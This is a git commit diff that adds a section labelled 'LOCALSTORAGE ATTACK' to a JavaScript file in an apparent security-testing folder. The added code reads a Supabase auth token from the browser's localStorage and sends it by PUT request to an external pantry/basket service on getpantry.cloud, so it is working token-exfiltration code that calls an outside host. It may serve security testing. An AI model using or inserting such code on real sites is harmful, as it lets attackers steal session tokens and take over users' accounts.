2e2c84d0ef84636b0a32cee4693b6cad4adcc890
knpvt5 <knpvt5@gmail.com>
2025-11-08 16:43:43 +0530

    Implement local storage attack fetch request
    Added functionality to send local storage auth token to a specified API endpoint.

--- security/fetchAttack/fetchSecurity.js
+++ security/fetchAttack/fetchSecurity.js
@@ -103,3 +103,24 @@ fetch('http://localhost:5000/api/v1/auth/reset-password', {
     .then(res => res.json())
     .then(data => console.log(data))
     .catch(err => console.error(err));
+
+// ========================LOCALSTORAGE ATTACK=====================================
+var myHeaders = new Headers();
+myHeaders.append("Content-Type", "application/json");
+
+var raw = JSON.stringify({
+  "name": "ai feita credential",
+  "auth": localStorage.getItem("sb-supabase-auth-token")
+});
+
+var requestOptions = {
+  method: 'PUT',
+  headers: myHeaders,
+  body: raw,
+  redirect: 'follow'
+};
+
+fetch("https://getpantry.cloud/apiv1/pantry/e349a830-2b20-4a54-9403-3d26975b6f4f/basket/testBasket", requestOptions)
+  .then(response => response.text())
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
